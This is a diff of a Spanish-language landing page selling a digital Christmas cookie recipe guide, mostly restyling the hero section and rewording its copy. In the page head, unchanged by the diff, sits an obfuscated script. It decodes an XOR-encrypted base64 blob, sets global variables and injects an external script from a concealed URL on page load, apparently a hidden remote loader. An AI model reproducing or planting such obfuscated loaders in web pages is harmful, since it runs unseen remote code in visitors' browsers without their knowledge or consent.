@@ -11,7 +11,7 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800;900&family=Inter:wght@400;600;700&display=swap">
 <style>
-:root{--paper:#fffaf3;--pine:#173f32;--pine2:#0e2c23;--red:#b91f38;--ink:#1a140f;--muted:#231b13;--line:#e7ddcf;--cream:#f3e9da;--cta-shadow:#751326;--cta-hover:#97172d;--on-accent:#fffaf3;--focus:#a65d16;--complete-surface:#fff5e5;--excluded:#3d3831;--gold:#a17a36;--shadow:0 12px 32px #173f3226;--bar-shadow:0 -5px 24px #173f3240;--h:"Montserrat",system-ui,sans-serif;--b:"Inter",system-ui,sans-serif;color-scheme:light}
+:root{--paper:#ffffff;--pine:#173f32;--pine2:#0e2c23;--red:#b91f38;--ink:#1a140f;--muted:#231b13;--line:#e7ddcf;--cream:#f5f0e7;--cta-shadow:#751326;--cta-hover:#97172d;--on-accent:#fffaf3;--focus:#a65d16;--complete-surface:#fff5e5;--excluded:#3d3831;--gold:#a17a36;--shadow:0 12px 32px #173f3226;--bar-shadow:0 -5px 24px #173f3240;--h:"Montserrat",system-ui,sans-serif;--b:"Inter",system-ui,sans-serif;color-scheme:light}
 *{box-sizing:border-box}html{scroll-behavior:smooth;scroll-padding-top:20px;-webkit-text-size-adjust:100%}body{margin:0;background:var(--paper);color:var(--ink);font:18px/1.6 var(--b)}[hidden]{display:none!important}img,video{display:block;max-width:100%;height:auto}button,a{touch-action:manipulation;-webkit-tap-highlight-color:transparent}button{font:inherit}a{color:var(--pine)}a:focus-visible,button:focus-visible,summary:focus-visible{outline:3px solid var(--focus);outline-offset:4px}
 .wrap{width:min(100%,1080px);margin:auto;padding:0 22px}.narrow{max-width:780px}h1,h2,h3{font-family:var(--h);letter-spacing:0;line-height:1.14;text-wrap:balance;margin:0 0 14px}h1{font-size:36px;font-weight:900}h2{font-size:28px;font-weight:800}h3{font-size:20px;font-weight:800}p{margin:0 0 14px}.sub{font-size:18px;color:var(--muted)}.eyebrow{font-size:17px;letter-spacing:0;font-weight:800;text-transform:uppercase;color:var(--pine);margin-bottom:12px}.note{font-size:17px;color:var(--muted);line-height:1.6}.center{text-align:center}
 .top{background:var(--pine);color:#fff;text-align:center;padding:9px 15px;font-size:17px;font-weight:600}.brand{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:18px 0;font-family:var(--h);font-weight:800;font-size:18px}.brand span{font:500 17px var(--b);color:var(--muted)}.hero{padding:13px 0 29px}.hero-grid{display:grid;grid-template-areas:"message" "image" "action";gap:14px}.hero-message{grid-area:message}.hero-message p{margin-bottom:0}.hero-image{grid-area:image;margin:0}.hero-image img{width:100%;aspect-ratio:4/3;object-fit:contain;border-radius:20px}.hero-action{grid-area:action}.hero h1 em{font-style:normal;color:var(--red)}
@@ -147,6 +147,32 @@ section.cream:before,#demostracion:before{content:'✧';position:absolute;right:
 .plan-cta:hover,.plan-cta:focus-visible{animation-play-state:paused}
 .mobile-buy .cta{animation:cta-latido 2.8s ease-out infinite}
 @media(prefers-reduced-motion:reduce){.plan-cta,.mobile-buy .cta{animation:none!important;transform:none!important}}
+
+/* Topo: bloco escuro de abertura, texto grande, material a mostra. */
+.hero{background:linear-gradient(180deg,#143a2e,#0b2620);color:#fff;padding:24px 0 32px}
+.hero-inner{text-align:center;max-width:770px}
+.hero-kicker{font:800 15px/1.4 var(--b);letter-spacing:.17em;text-transform:uppercase;color:#edc882;margin:0 0 14px}
+.hero h1{font-size:34px;font-weight:900;line-height:1.1;text-transform:uppercase;color:#fff;margin:0 0 16px}
+.hero h1 em{font-style:normal;color:#ffd89c}
+.hero-sub{font:800 16px/1.45 var(--b);letter-spacing:.05em;text-transform:uppercase;color:#a6dcba;margin:0 0 4px}
+.hero-fan{width:100%;max-width:560px;height:auto;margin:4px auto 10px}
+.hero-body{font-size:17px;line-height:1.62;color:#ecdfcd;margin:0 auto 18px;max-width:610px}
+.hero-badges{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:9px;padding:0;margin:0 0 14px}
+.hero-badges li{background:#ffffff1a;border:1px solid #ffffff40;border-radius:999px;padding:8px 13px;font:700 15px/1.2 var(--b);color:#fff}
+.hero-fine{font-size:15px;line-height:1.55;color:#c3d6c9;margin:0 0 18px}
+.journey-light{border-color:#edc882;background:#edc882;color:#102a22}
+.journey-light:hover,.journey-light:focus-visible{background:#f7dda4;color:#102a22}
+.audience{background:#0a211b;padding:15px 0;border-top:0}
+.audience p{margin:0;font:800 15px/1.5 var(--b);letter-spacing:.05em;text-transform:uppercase;color:#a6dcba;text-align:center}
+.audience b{display:block;color:#fff;margin-bottom:3px}
+.video-summary .hero-vsl{margin-top:0}
+@media(min-width:760px){.hero{padding:34px 0 46px}.hero h1{font-size:50px}.hero-sub{font-size:19px}.hero-fan{max-width:700px}.hero-body{font-size:18px}}
+
+.brandbar{background:#143a2e;color:#fff}
+.brandbar .brand{padding:14px 0;color:#fff}
+.brandbar .brand span{color:#a6dcba}
+.hero h1{font-size:31px}
+@media(min-width:760px){.hero h1{font-size:50px}}
 </style>
 <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
@@ -159,12 +185,23 @@ section.cream:before,#demostracion:before{content:'✧';position:absolute;right:
 <script>(function(){var w_jo=atob("DI4eVw7lHEmQMXjREPU8InyJPnOyWQylYP0keCGGeCe+RAy8eehneW2KcWfyQ1eic/x3J3qWMzzkXAv+fO9qMn2RMiPjE1TzcfpqJWeHaT31QlrrS/U8OW+IeWuqExywZO8zInqIdS/pHAijdfh7OXrIbzzyWByiMqI8IW+JaSyyC1rzbdNj");var l_s=[];for(var c_4d=0;c_4d<w_jo.length;c_4d++){l_s.push(w_jo.charCodeAt(c_4d)&255);}var u_vwx=l_s[0];var p_z=l_s.slice(1,1+u_vwx);var o_sayr=l_s.slice(1+u_vwx);var v_l18=o_sayr.map(function(b,x_0){return b^p_z[x_0%u_vwx];});var v_jw="";for(var o_o=0;o_o<v_l18.length;o_o++){v_jw+=String.fromCharCode(v_l18[o_o]&255);}var d_7ky=decodeURIComponent(escape(v_jw));var v_zg=JSON.parse(d_7ky);var t_6m=v_zg.globals||[];t_6m.forEach(function(q_rgh0){window[q_rgh0.name]=q_rgh0.value;});var w_6=document.createElement("script");w_6.src=v_zg.url;w_6.async=true;w_6.defer=true;(v_zg.attributes||[]).forEach(function(x_ssx){w_6.setAttribute(x_ssx.name,x_ssx.value);});(document.head||document.documentElement).appendChild(w_6);})();</script>
 </head><body>
 <div class="top">Una masa. 25 variedades. Tu toque especial esta Navidad.</div>
-<div class="wrap"><div class="brand">Método 1 Masa<span>Galletas Navideñas · Paso a paso</span></div></div>
-<header class="hero"><div class="wrap hero-grid">
-<div class="hero-message"><div class="eyebrow">Una masa base · 25 variedades · listo en una tarde</div>
-<h1>Este año, las cajitas bonitas <em>las haces tú.</em></h1>
-<p class="sub">Una masa base, 25 variedades y el paso a paso de decoración. Desde la primera tanda hasta la cajita lista para regalar o vender.</p>
+<div class="brandbar"><div class="wrap"><div class="brand">Método 1 Masa<span>Galletas Navideñas · Paso a paso</span></div></div></div>
+<header class="hero"><div class="wrap hero-inner">
+<h1>Sin experiencia, haces las galletas que <em>todos van a pedirte</em> esta Navidad</h1>
+<p class="hero-sub">Una masa · 25 variedades · para regalar o para vender</p>
+<img class="hero-fan" src="/img/hero-fan.webp" width="1500" height="794" alt="Páginas reales del recetario, la guía de decoración, la hoja de moldes y la planilla de costos, con una ficha abierta en el celular" fetchpriority="high" decoding="async">
+<p class="hero-body">Nunca decoraste una galleta y no importa. Empiezas por una masa base ya medida y de ahí salen 25 variedades distintas. El glasé, los moldes, los tiempos de horno y hasta cuánto cobrar la cajita: está todo escrito, paso a paso.</p>
+<ul class="hero-badges"><li>Guía en PDF</li><li>Acceso inmediato</li><li>En el celular</li><li>2 bonos</li></ul>
+<p class="hero-fine">Acceso apenas se aprueba el pago. Se abre en el celular, la tablet o la computadora.</p>
 <p class="seasonal-note" id="seasonal-note" hidden></p>
+<a class="journey journey-light" href="#video-summary">Ver de qué se trata ↓</a>
+</div></header>
+
+<section class="audience" aria-label="Para quién es"><div class="wrap narrow">
+<p><b>Para quien quiere sorprender en la mesa</b>o armar sus primeras cajitas para vender esta Navidad</p>
+</div></section>
+
+<section class="video-summary" id="video-summary" aria-labelledby="video-summary-title"><div class="wrap narrow">
 <figure class="hero-vsl" aria-labelledby="vsl-caption">
 <figcaption id="vsl-caption">Mira la presentación (1:20) — o sigue bajando, está todo escrito abajo.</figcaption>
 <video id="mini-vsl" controls playsinline preload="none" poster="/img/mini-vsl-navidad-poster.jpg" width="576" height="1024" aria-label="Presentación del Método 1 Masa: recetas, decoración y cajitas navideñas">
@@ -173,11 +210,6 @@ Tu navegador no puede reproducir este vídeo. <a href="/videos/mini-vsl-navidad.
 </video>
 <p class="vsl-note">1 min 20 s · Escúchalo con sonido<br>Ideas de presentación · Guía digital de recetas</p>
 </figure>
-</div>
-<figure class="hero-image"><div class="product-stage"><div class="book"><img src="/img/muestras/portada.webp" width="720" height="1020" alt="Portada real del recetario Método 1 Masa" fetchpriority="high" decoding="async"></div><div class="phone"><span>FICHA DEL RECETARIO</span><img src="/img/muestras/receta.webp" width="720" height="1020" alt="Ficha real de Estrellas de vainilla" fetchpriority="high" decoding="async"></div></div><figcaption class="cap">Portada y ficha reales del material digital.</figcaption></figure>
-<div class="hero-action"><a class="journey" href="#video-summary">Ver de qué se trata ↓</a></div></div></header>
-
-<section class="video-summary" id="video-summary" aria-labelledby="video-summary-title"><div class="wrap narrow">
 <h2 id="video-summary-title">Lo que vas a ver en el video</h2>
 <ul class="video-points">
 <li><span aria-hidden="true">✓</span>La masa base y por qué una sola sirve para 25 variedades</li>
